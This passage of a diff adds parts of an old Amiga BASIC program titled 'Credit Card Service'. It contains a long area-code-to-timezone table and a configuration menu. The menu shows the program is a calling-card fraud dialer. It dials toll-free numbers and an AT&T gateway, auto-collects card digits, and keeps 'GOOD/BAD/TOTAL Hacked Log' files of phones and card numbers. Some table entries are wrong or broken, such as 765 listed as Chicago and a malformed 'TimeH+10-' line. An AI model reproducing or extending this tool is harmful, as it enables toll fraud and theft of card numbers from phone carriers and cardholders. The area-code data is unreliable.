+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Ottawa"
+Endif
+IF A$ == "614"
+ TimeH=TimeH-5
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Columbus"
+Endif
+IF A$ == "615"
+ TimeH=TimeH-6
+ ASD1$ = "Tennessee (TN)    "
+ ASD2$ = "Chattanooga, Nashville"
+Endif
+IF A$ == "616"
+ TimeH=TimeH-5
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Battle Creek, Grand Rapids, Kalamazoo"
+Endif
+IF A$ == "617"
+ TimeH=TimeH-5
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Boston, New Bedford, Plymouth, Worcester"
+Endif
+IF A$ == "618"
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Alton, Centralia, Mt. Vernon"
+Endif
+IF A$ == "619"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Barstow, Carlsbad, San Diego, Santee"
+Endif
+IF A$ == "626"
+ TimeH=TimeH-8
+ ASD1$ = "California        "
+ ASD2$ = "Burbank, Glendale, Pasadena"
+Endif
+IF A$ == "630"
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = ""
+Endif
+IF A$ == "649"
+ TimeH=TimeH-5
+ ASD1$ = "TurksCaicosIslands"
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "650"
+ TimeH=TimeH-8
+ ASD1$ = "California        "
+ ASD2$ = "Los Altos, Palo Alto,South San Francisco"
+Endif
+IF A$ == "664"
+ TimeH=TimeH-4
+ ASD1$ = "Montserrat        "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "670"
+ TimeH=TimeH+10-
+ 
+ ASD1$ = "North Mariana Isl."
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "671"
+ TimeH=TimeH+10
+ ASD1$ = "Guam              "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "700"
+ TimeH=TimeH
+ ASD1$ = "Lifetime phone    "
+ ASD2$ = ""
+Endif
+IF A$ == "701"
+ TimeH=TimeH-6
+ ASD1$ = "North Dakota (ND) "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "702"
+ TimeH=TimeH-8
+ ASD1$ = "Nevada (NV)       "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "703"
+ TimeH=TimeH-5
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Arlington, Roanoke, Winchester"
+Endif
+IF A$ == "704"
+ TimeH=TimeH-5
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Charlotte, Salisbury"
+Endif
+IF A$ == "705"
+ TimeH=TimeH-5
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), North Bay"
+Endif
+IF A$ == "706"
+ TimeH=TimeH-5
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Augusta, Martinez, Columbus"
+Endif
+IF A$ == "707"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Santa Rosa"
+Endif
+IF A$ == "708"
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Northbrook, Antioch, Evanston, Elgin, Harvey, Peotone"
+Endif
+IF A$ == "709"
+ TimeH=TimeH-3.5
+ ASD1$ = "Canada (CN)!      "
+ ASD2$ = "Newfoundland (NF), Labrador"
+Endif
+IF A$ == "712"
+ TimeH=TimeH-6
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Council Bluffs"
+Endif
+IF A$ == "713"
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Pasadena, Houston, Rosenberg"
+Endif
+IF A$ == "714"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Orange County"
+Endif
+IF A$ == "715"
+ TimeH=TimeH-6
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Eau Claire, Wausau"
+Endif
+IF A$ == "716"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Buffalo, Niagara Falls, Rochester"
+Endif
+IF A$ == "717"
+ TimeH=TimeH-5
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Harrisburg, Scranton"
+Endif
+IF A$ == "718"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Brooklyn, Queens, Staten Island"
+Endif
+IF A$ == "719"
+ TimeH=TimeH-7
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Colorado Springs, Pueblo, Canon City"
+Endif
+IF A$ == "732"
+ TimeH=TimeH-4
+ ASD1$ = "New Jersey        "
+ ASD2$ = "Long Branch, New Brunswick"
+Endif
+IF A$ == "757"
+ TimeH=TimeH-5
+ ASD1$ = "Virginia          "
+ ASD2$ = "Norfolk, Newport News, Williamsburg"
+Endif
+IF A$ == "758"
+ TimeH=TimeH-4
+ ASD1$ = "St Lucia          "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "760"
+ TimeH=TimeH-9
+ ASD1$ = "California        "
+ ASD2$ = "Barstow, Palm Springs"
+Endif
+IF A$ == "765"
+ TimeH=TimeH-6
+ ASD1$ = "Indiana           "
+ ASD2$ = "Chicago"
+Endif
+IF A$ == "770"
+ TimeH=TimeH-5
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Atlanta, Conyers, Decatur, Marietta, Riverdale"
+Endif
+IF A$ == "773"
+ TimeH=TimeH-6
+ ASD1$ = "Illinois          "
+ ASD2$ = "Chicago"
+Endif
+IF A$ == "787"
+ TimeH=TimeH-4
+ ASD1$ = "Puerto Rico       "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "800"
+ TimeH=TimeH
+ ASD1$ = "Toll Free In U.S. "
+ ASD2$ = ""
+Endif
+IF A$ == "801"
+ TimeH=TimeH-7
+ ASD1$ = "Utah (UT)         "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "802"
+ TimeH=TimeH-6
+ ASD1$ = "Vermont (VT)      "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "803"
+ TimeH=TimeH-5
+ ASD1$ = "South Carolina    "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "804"
+ TimeH=TimeH-5
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Charlottesville, Newport News, Norfolk, Richmond"
+Endif
+IF A$ == "805"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Bakersfield"
+Endif
+IF A$ == "806" 
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Amarillo, Borger, Dalhart, Lubbock"
+Endif
+IF A$ == "807"
+ TimeH=TimeH-5
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Thunder Bay"
+Endif
+IF A$ == "808"
+ TimeH=TimeH-10
+ ASD1$ = "Hawaii (HI)       "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "809"
+ TimeH=TimeH-4
+ ASD1$ = "Various Location  "
+ ASD2$ = "Anguilla,Antigua,Bahamas,Barbados,Bequia,Bermuda,Cayman Islands,Dominican Rep,Jamaica,Montserrat,Palm Island,Puerto Rico (PR),St Lucia,St Vincent,Trinidad,Tobago,Union Island,Virgin Islands (VI)"
+Endif
+IF A$ == "810" 
+ TimeH=TimeH-5
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Brighton,Flint,Pontiac,Mt. Clemens,Snover,Warren,Troy,Madison Heights,Port Huron,Royal Oak,Oak Park,Southfield"
+Endif
+IF A$ == "812"
+ TimeH=TimeH-6
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Evansville"
+Endif
+IF A$ == "813"
+ TimeH=TimeH-6
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Ft. Myers, Winter Haven"
+Endif
+IF A$ == "814"
+ TimeH=TimeH-5
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Altoona, Erie"
+Endif
+IF A$ == "815"
+ TimeH=TimeH-6
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Rockford, Woodstock, Joliet"
+Endif
+IF A$ == "816"
+ TimeH=TimeH-6
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Belton, Independence, Kansas City, Marshall, St Joseph, Sedalia"
+Endif
+IF A$ == "817"
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Denton, Fort Worth, Temple, Waco"
+Endif
+IF A$ == "818"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Fernando Valley Area"
+Endif
+IF A$ == "819"
+ TimeH=TimeH-4
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ)"
+Endif
+IF A$ == "830"
+ TimeH=TimeH-6
+ ASD1$ = "Texas             "
+ ASD2$ = "Fredericksburg, Kerrville, San Antonio"
+Endif
+IF A$ == "847"
+ TimeH=TimeH-6
+ ASD1$ = "Illinois          "
+ ASD2$ = "Chicago, Evanston, Waukegan"
+Endif
+IF A$ == "850"
+ TimeH=TimeH-5
+ ASD1$ = "Florida           "
+ ASD2$ = "Panama City, Pensacola, Tallahassee"
+Endif
+IF A$ == "860"
+ TimeH=TimeH-5
+ ASD1$ = "Connecticut       "
+ ASD2$ = "Hartford"
+Endif
+IF A$ == "864"
+ TimeH=TimeH-5
+ ASD1$ = "South Carolina    "
+ ASD2$ = "Anderson, Greenville, Spartanburg"
+Endif
+IF A$ == "867"
+ TimeH=TimeH-4
+ ASD1$ = "Northwest Territ. "
+ ASD2$ = "Whitehorse"
+Endif
+IF A$ == "868"
+ TimeH=TimeH-4
+ ASD1$ = "Trinidad & Tobago "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "869"
+ TimeH=TimeH-4
+ ASD1$ = "St Kitts & Nevis  "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "870"
+ TimeH=TimeH-6
+ ASD1$ = "Arkansas          "
+ ASD2$ = "El Dorado, Jonesboro, Paine Bluff"
+Endif
+IF A$ == "876"
+ TimeH=TimeH-5
+ ASD1$ = "Jamaica           "
+ ASD2$ = "(ALL)"
+Endif
+IF A$ == "888"
+ TimeH=TimeH
+ ASD1$ = "Toll-Free         "
+ ASD2$ = "free for caller"
+Endif
+IF A$ == "900"
+ TimeH=TimeH
+ ASD1$ = "Additional Charges"
+ ASD2$ = "Pay-Per-Call (caller pays)"
+Endif
+IF A$ == "901"
+ TimeH=TimeH-6
+ ASD1$ = "Tennessee (TN)    "
+ ASD2$ = "Memphis"
+Endif
+IF A$ == "902"
+ TimeH=TimeH-4
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Prince Edward Island (PE), Nova Scotia (NS)"
+Endif
+IF A$ == "903"
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Greenville, Longview, Texarkana, Tyler"
+Endif
+IF A$ == "904"
+ TimeH=TimeH-5
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Jacksonville, Tallahassee"
+Endif
+IF A$ == "905"
+ TimeH=TimeH-5
+ ASD1$ = "Canada (CA)       "
+ ASD2$ = "Ontario (ON),Burlington,Bowmanville,Hamilton,Mississauga,Oshawa,St.Catharines,Welland,Niagara Falls"
+Endif
+IF A$ == "906"
+ TimeH=TimeH-5
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Escanaba, Marquette, Sault Ste. Marie"
+Endif
+IF A$ == "907"
+ TimeH=TimeH-9
+ ASD1$ = "Alaska (AK)       "
+ ASD2$ = "(All)"
+Endif
+IF A$ == "908"
+ TimeH=TimeH-5
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Edison"
+Endif
+IF A$ == "909"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Ontario, Riverside, San Bernardino"
+Endif
+IF A$ == "910"
+ TimeH=TimeH-5
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Asheboro, Fayetteville, Mt Airy, Wilkesboro, Wilmington"
+Endif
+IF A$ == "912" TimeH=TimeH-5
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Savannah, Waycross"
+Endif
+IF A$ == "913"
+ TimeH=TimeH-6
+ ASD1$ = "Kansas (KS)       "
+ ASD2$ = "Lawrence, Manhattan, Salina, Topeka"
+Endif
+IF A$ == "914"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "White Plains"
+Endif
+IF A$ == "915"
+ TimeH=TimeH-6
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Abilene, Alpine, Big Spring, El Paso, Midland, Odessa"
+Endif
+IF A$ == "916"
+ TimeH=TimeH-8
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Sacramento"
+Endif
+IF A$ == "917"
+ TimeH=TimeH-5
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "New York City"
+Endif
+IF A$ == "918"
+ TimeH=TimeH-6
+ ASD1$ = "Oklahoma (OK)     "
+ ASD2$ = "Bartlesville, Mcalester, Muskogee, Tulsa"
+Endif
+IF A$ == "919"
+ TimeH=TimeH-5
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Greenville, Raleigh, Winston,Salem"
+Endif
+IF A$ == "920"
+ TimeH=TimeH-6
+ ASD1$ = "Wisconsin         "
+ ASD2$ = "Green Bay, Oshkosh"
+Endif
+IF A$ == "937"
+ TimeH=TimeH-5
+ ASD1$ = "Ohio              "
+ ASD2$ = "Middletown, Springfield, Wilmington, Xenia"
+Endif
+IF A$ == "940"
+ TimeH=TimeH-6
+ ASD1$ = "Texas             "
+ ASD2$ = "Denton, Wichita Falls"
+Endif
+IF A$ == "941"
+ TimeH=TimeH-5
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Bradenton, Englewood, Fort Myers, Lakeland, Naples, Sarasota"
+Endif
+IF A$ == "954"
+ TimeH=TimeH-5
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = ""
+Endif
+IF A$ == "956"
+ TimeH=TimeH-6
+ ASD1$ = "Texas             "
+ ASD2$ = "Brownsville, McAllen"
+Endif
+IF A$ == "970"
+ TimeH=TimeH-7
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Ft Collins, Greeley, Loveland"
+Endif
+IF A$ == "972"
+ TimeH=TimeH-6
+ ASD1$ = "Texas             "
+ ASD2$ = "Dallas, Garland, Grand Prairie, Irving, Plano"
+Endif
+IF A$ == "973"
+ TimeH=TimeH-5
+ ASD1$ = "New Jersey        "
+ ASD2$ = "Newark, Paterson"
+Endif
+TimeH$ = STR$(Timeh)
+RETURN
+
+CONFIG:
+
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- Configuration Menu -*-"
+Print Local
+Print Local " -1-  AreaCode 3 Digits  (0=Prompt)     -15- Module 1        "
+Print Local " -2-  Phone 7 Digits     (0=Prompt)     -16- Module 2        "
+Print Local " -3-  Auto Call File (internal use)     -17- Module 3        "
+Print Local " -4-  Redial Delay                      -18- Module 4        "
+Print Local " -5-  Minim Card Digits On AutoCollect  -19- Module 5        "
+Print Local " -6-  Modem Prefix 1 (dial tollfree)    -20- Module 6        "
+Print Local " -7-  Modem Prefix 2 (dial numbers)     -21- Module 7        "
+Print Local " -8-  Tollfree Number                   -22- Module 8        "
+Print Local " -9-  Auto Call Gateway                 -23- Module 9        "
+Print Local " -10- Auto Call Bill                    -24- Dial Skip       "
+Print Local " -11- Card Collect SaveList             -25- GOOD Hacked Log "
+Print Local " -12- Auto Call File (internal use)     -26- BAD Hacked Log  "
+Print Local " -13- Delay's Menu                      -27- TOTAL Hacked Log"
+Print Local " -14- Mod Player                        -28- External Editor "
+Print Local
+Print Local " -0- EXIT & SAVE "
+print Local
+input local "Please Select Function (0-28) >: ",V$
+     if V$ == "1"
+	CLS
+	Print Local "Please Enter Areacode (3 Digits)"
+	Print Local "Previous Config : "A$
+	Input Local "Please Enter Your Choice: ", A$
+	endif
+     if V$ == "2"
+	CLS
+	Print Local "Phone Digits (7 Digits)"
+	Print Local "Previous Config : "B$
+	Input Local "Please Enter Your Choice: ",B$
+	endif
+     if V$ == "3"
+	CLS
+	Print Local "Modem Init String"
+	Print Local "Used to Init Modem on Startup"
+	Print Local "Previous Config : "Temp$
+	Input Local "Please Enter Your Choice: ",Temp$
+	endif
+     if V$ == "4"
+	CLS
+	Print Local "Redial Delay (0-999)"
+	Print Local "Previous Config : "Delay
+	Input Local "Please Enter Your Choice: ",Delay
+	endif
+     if V$ == "5"
+	CLS
+	Print Local "Minim Card Digits On AutoCollect"
+	Print Local "Previous Config : "Count
+	Input Local "Please Enter Your Choice: ",Count
+	endif
+     if V$ == "6"
+	CLS
+	Print Local "Modem Prefix 1 - Dial Service (atm3dt for silent dialing)"
+	Print Local "Previous Config : "Prefix1$
+	Input Local "Please Enter Your Choice: ",Prefix1$
+	endif
+     if V$ == "7"
+	CLS
+	Print Local "Modem Prefix 2 - Dial Numbers (atm3dt for silent dialing)"
+	Print Local "Previous Config : "Prefix2$
+	Input Local "Please Enter Your Choice: ",Prefix2$
+	endif
+     if V$ == "8"
+	CLS
+	Print Local "Tollfree Number"
+	Print Local "Previous Config : "Tollfree$
+	Input Local "Please Enter Your Choice: ",Tollfree$
+	endif
+     if V$ == "9"
+	CLS
+	Print Local "Auto Call Gateway"
+	Print Local "AT&T=0##"
+	Print Local "Previous Config : "Toll01$
+	Input Local "Please Enter Your Choice: ",Toll01$
+	endif
+     if V$ == "10"
+	CLS
+	Print Local "Auto Call Bill"
+	Print Local "AT&T=111"
+	Print Local "Previous Config : "Toll02$
+	Input Local "Please Enter Your Choice: ",Toll02$
+	endif
+     if V$ == "11"
+	CLS
+	Print Local "Capture SaveList"
+	Print Local "Card Capture Save File Log Path+File"
+	Print Local "Dialed Areacode is Autoadded as extencion (Example:CardList_707)"
+	Print Local "Previous Config : "Cards$
+	Input Local "Please Enter Your Choice: ",Cards$
+	endif
+     if V$ == "12"
+	CLS
+	Print Local "Auto Call File"
+	Print Local "Used to count calls & Internal Use"
+	Print Local "Dialed Areacode is Autoadded as extencion (Example:Dialer_707)"
+	Print Local "Previous Config : "Dirlog$
+	Input Local "Please Enter Your Choice: ",Dirlog$
+	endif
+
+     if V$ == "13"
+	CLS
+	Print Local "Please Enter Delay Seconds After TollFree Dialing ..."
+	Print Local "Previous Config : "A1
+	Input Local "Please Enter Your Choice: ", A1
+	Print Local "Please Enter Delay Seconds After Number Dialing ..."
+	Print Local "Previous Config : "A2
+	Input Local "Please Enter Your Choice: ", A2
+	Print Local "Please Enter Delay Seconds After Gateway (0##) Dialing ..."
+	Print Local "Previous Config : "A3
+	Input Local "Please Enter Your Choice: ", A3
+	Print Local "Please Enter Delay Seconds After CARD Dialing ..."
+	Print Local "Previous Config : "A5
+	Input Local "Please Enter Your Choice: ", A5
+	endif
+
+     if V$ == "14"
+	CLS
+	Print Local "Mod Player"
+	Print Local "Full Path+Filename To the Mod Player"
+	Print Local "Previous Config : "Player$
+	Input Local "Please Enter Your Choice:",Player$
+	endif
+     if V$ == "15"
+	CLS
+	Print Local "IFF Module Track 1"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module01$
+	Print Local "Previous Comment : "Comment01$
+	Input Local "Please Enter Your Choice : ",Module01$
+	Input Local "Please Enter Module Name : ",Comment01$
+	endif
+     if V$ == "16"
+	CLS
+	Print Local "IFF Module Track 2"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module02$
+	Print Local "Previous Comment : "Comment02$
+	Input Local "Please Enter Your Choice : ",Module02$
+	Input Local "Please Enter Module Name : ",Comment02$
+	endif
+     if V$ == "17"
+	CLS
+	Print Local "IFF Module Track 3"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module03$
+	Print Local "Previous Comment : "Comment03$
+	Input Local "Please Enter Your Choice : ",Module03$
+	Input Local "Please Enter Module Name : ",Comment03$
+	endif
+     if V$ == "18"
+	CLS
+	Print Local "IFF Module Track 4"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module04$
+	Print Local "Previous Comment : "Comment04$
+	Input Local "Please Enter Your Choice : ",Module04$
+	Input Local "Please Enter Module Name : ",Comment04$
+	endif
+     if V$ == "19"
+	CLS
+	Print Local "IFF Module Track 5"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module05$
+	Print Local "Previous Comment : "Comment05$
+	Input Local "Please Enter Your Choice : ",Module05$
+	Input Local "Please Enter Module Name : ",Comment05$
+	endif
+     if V$ == "20"
+	CLS
+	Print Local "IFF Module Track 6"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module06$
+	Print Local "Previous Comment : "Comment06$
+	Input Local "Please Enter Your Choice : ",Module06$
+	Input Local "Please Enter Module Name : ",Comment06$
+	endif
+
+     if V$ == "21"
+	CLS
+	Print Local "IFF Module Track 7"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module07$
+	Print Local "Previous Comment : "Comment07$
+	Input Local "Please Enter Your Choice : ",Module07$
+	Input Local "Please Enter Module Name : ",Comment07$
+	endif
+     if V$ == "22"
+	CLS
+	Print Local "IFF Module Track 8"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module08$
+	Print Local "Previous Comment : "Comment08$
+	Input Local "Please Enter Your Choice : ",Module08$
+	Input Local "Please Enter Module Name : ",Comment08$
+	endif
+     if V$ == "23"
+	CLS
+	Print Local "IFF Module Track 9"
+	Print Local "Fulle Path+Filename To the IFF Module"
+	Print Local "Previous Config  : "Module09$
+	Print Local "Previous Comment : "Comment09$
+	Input Local "Please Enter Your Choice : ",Module09$
+	Input Local "Please Enter Module Name : ",Comment09$
+	endif
+
+     if V$ == "24"
+	CLS
+	Print Local "Please Enter NumberCount Skip (1=1+1)..."
+	Print Local "Previous Config : "A4
+	Input Local "Please Enter Your Choice: ", A4
+	endif
+     if V$ == "25"
+	CLS
+	Print Local "GOOD Hacked Log"
+	Print Local "Save File Log Phone(s)+Card(s)"
+	Print Local "Dialed Areacode is Autoadded as extencion (Example:At&T:GoodList_707)"
+	Print Local "Press Return/Blank Field to Disable Option"
+	Print Local "Previous Config : "GL$
+	Input Local "Please Enter Your Choice: ",GL$
+	endif
+     if V$ == "26"
+	CLS
+	Print Local "BAD Hacked Log"
+	Print Local "Save File Log Phone(s) Not Hacked"
+	Print Local "Dialed Areacode is Autoadded as extencion (Example:AT&T:BadList_707)"
+	Print Local "Press Return/Blank Field to Disable Option"
+	Print Local "Previous Config : "BL$
+	Input Local "Please Enter Your Choice: ",BL$
+	endif
+     if V$ == "27"
+	CLS
+	Print Local "TOTAL Hacked Log"
+	Print Local "Save File Total Card(s) Numbers"
+	Print Local "Press Return/Blank Field to Disable Option"
+	Print Local "Previous Config : "TL$
+	Input Local "Please Enter Your Choice: ",TL$
+	endif
+     if V$ == "28"
+	CLS
+	Print Local "External Editor"
+	Print Local "Full Path+Filename To the External Editor"
+	Print Local "Previous Config : "Editor$
+	Input Local "Please Enter Your Choice:",Editor$
+	endif
+     if V$ == "0"
+	Goto ACFG
+	ELSE GOTO CONFIG
+	endif
+
+SCCFG:
+
+ASK "Sure to Save Changed values ? (Y/N/+/-/C/?) ", Y$
+Y$ = LOWER$(Y$)
+If Y$ == "n"
+ Print Local "\nExiting ..."
+ Goto MainMenu
+endif
+If Y$ == "y"
+ Print Local "\nSaving ..."
+ Goto SCFG
+endif
+If Y$ == "-"
+ Print Local "\nConfig wincheck 1 ..."
+ Goto ACFG
+endif
+If Y$ == "+"
+ Print Local "\nConfig wincheck 2 ..."
+ Goto BCFG
+endif
+If Y$ == "c"
+ Print Local "\nBack to Configuration Tool..."
+ Goto CONFIG
+endif
+If Y$ == "?"
+ Loop = 0
+ CLS
+ Print Local "                                                    ###"
+ Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+ Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+ Print Local
+ Print Local
+ Print Local " Y = Save Config & back to MainMenu (read new values)"
+ Print Local " N = NoSave & Back to MainMenu"
+ Print Local " + = 01-13 Option Check Window"
+ Print Local " - = 13-26 Option Check Window"
+ Print Local " C = Back to Configuration Tool"
+ Print Local
+ Print Local "Help Window 15 Second Display ...";
+	CHELP:
+	Loop = Loop + 1
+	If Loop > 15
+	Loop = 0
+	 GOTO ACFG
+	else
+	PRINT   LOCAL ".";
+	Pause 1
+	Goto CHELP
+	endif
+     endif
+
+BCFG:
+CLS
+Print Local
+Print Local " -*- [33mConfiguration Check Menu[0m -*-"
+Print Local
+Print Local " -14- Mod Player...... " Player$
+Print Local " -15- Module 1........ " Module01$
+Print Local " -15- Comment 1....... " Comment01$
+Print Local " -16- Module 2........ " Module02$
+Print Local " -16- Comment 2....... " Comment02$
+Print Local " -17- Module 3........ " Module03$
+Print Local " -17- Comment 3....... " Comment03$
+Print Local " -18- Module 4........ " Module04$
+Print Local " -18- Comment 4....... " Comment04$
+Print Local " -19- Module 5........ " Module05$
+Print Local " -19- Comment 5....... " Comment05$
+Print Local " -20- Module 6........ " Module06$
+Print Local " -20- Comment 6....... " Comment06$
+Print Local " -21- Module 7........ " Module07$
+Print Local " -21- Comment 7....... " Comment07$
+Print Local " -22- Module 8........ " Module08$
+Print Local " -22- Comment 8....... " Comment08$
+Print Local " -23- Module 9........ " Module09$
+Print Local " -23- Comment 9....... " Comment09$
+Print Local " -24- Dial Skip....... " A4
+Print Local " -25- GOOD Hacked Log. " GL$
+Print Local " -26- BAD Hacked Log.. " BL$
+Print Local " -27- TOT Hacked Log.. " TL$
+Print Local " -28- External Editor. " Editor$
+Print Local
+Goto SCCFG
+
+ACFG:
+CLS
+print Local
+Print Local " -*- [33mConfiguration Check Menu[0m -*-"
+Print Local
+Print Local " -1-  AreaCode 3 Digits  (0=Prompt)............... " A$
+Print Local " -2-  Phone 7 Digits     (0=Prompt)............... " B$
+Print Local " -3-  Modem Init String .......................... " Temp$
+Print Local " -4-  Redial Delay ............................... " Delay
+Print Local " -5-  Minim Card Digits On AutoCollect............." Count
+Print Local " -6-  Modem Prefix 1 (dial tollfree).............. " Prefix1$
+Print Local " -7-  Modem Prefix 2 (dial numbers) .............. " Prefix2$
+Print Local " -8-  Tollfree Number............................. " Tollfree$
+Print Local " -9-  Auto Call Gateway........................... " Toll01$
+Print Local " -10- Auto Call Bill.............................. " Toll02$
+Print Local " -11- Capture SaveList............................ " Cards$
+Print Local " -12- Auto Call File (internal use)............... " Dirlog$
+Print Local " -13- Delay Seconds After TollFree Dialing........ " A1
+Print Local " -13- Delay Seconds After Number Dialing.......... " A2
+Print Local " -13- Delay Seconds After Gateway (0##) Dialing... " A3
+Print Local " -13- Delay Seconds After CARD Dialing............ " A5
+Print Local 
+Gosub SCCFG
+Goto Mainmenu
+END
+SCFG:
+	open Output 1, "ENVARC:Dialer00.prefs"
+	write #1, A$
+	write #1, B$
+	write #1, Temp$
+	write #1, Delay
+	write #1, Count
+	write #1, Prefix1$
+	write #1, Prefix2$
+	write #1, Tollfree$
+	write #1, Toll01$
+	write #1, Toll02$
+	write #1, Cards$
+	write #1, Dirlog$
+	write #1, A1
+	write #1, A2
+	write #1, A3
+	write #1, A4
+	write #1, A5
+	write #1, A6
+	write #1, A7
+	write #1, A8
+	write #1, A9
+	write #1, A10
+	write #1, Player$
+	write #1, Module01$
+	write #1, Comment01$
+	write #1, Module02$
+	write #1, Comment02$
+	write #1, Module03$
+	write #1, Comment03$
+	write #1, Module04$
+	write #1, Comment04$
+	write #1, Module05$
+	write #1, Comment05$
+	write #1, Module06$
+	write #1, Comment06$
+	write #1, Module07$
+	write #1, Comment07$
+	write #1, Module08$
+	write #1, Comment08$
+	write #1, Module09$
+	write #1, Comment09$
+	write #1, B7
+	write #1, B8
+	write #1, GL$
+	write #1, BL$
+	write #1, TL$
+	write #1, Editor$
+	close #1
+
+	open Output 1, "ENV:Dialer00.prefs"
+	write #1, A$
+	write #1, B$
+	write #1, Temp$
+	write #1, Delay
+	write #1, Count
+	write #1, Prefix1$
+	write #1, Prefix2$
+	write #1, Tollfree$
+	write #1, Toll01$
+	write #1, Toll02$
+	write #1, Cards$
+	write #1, Dirlog$
+	write #1, A1
+	write #1, A2
+	write #1, A3
+	write #1, A4
+	write #1, A5
+	write #1, A6
+	write #1, A7
+	write #1, A8
+	write #1, A9
+	write #1, A10
+	write #1, Player$
+	write #1, Module01$
+	write #1, Comment01$
+	write #1, Module02$
+	write #1, Comment02$
+	write #1, Module03$
+	write #1, Comment03$
+	write #1, Module04$
+	write #1, Comment04$
+	write #1, Module05$
+	write #1, Comment05$
+	write #1, Module06$
+	write #1, Comment06$
+	write #1, Module07$
+	write #1, Comment07$
+	write #1, Module08$
+	write #1, Comment08$
+	write #1, Module09$
+	write #1, Comment09$
+	write #1, B7
+	write #1, B8
+	write #1, GL$
+	write #1, BL$
+	write #1, TL$
+	write #1, Editor$
+	close #1
+Gosub LOAD
+RETURN
+
+PRELOAD:
+
+A7=0	/*Not used*/
+A8=0	/*Not used*/
+A9=0	/*Not used*/
+A10=0	/*Not used*/
+AL1$="ENV:AreaCode.Prefs"	/*default areacode list*/
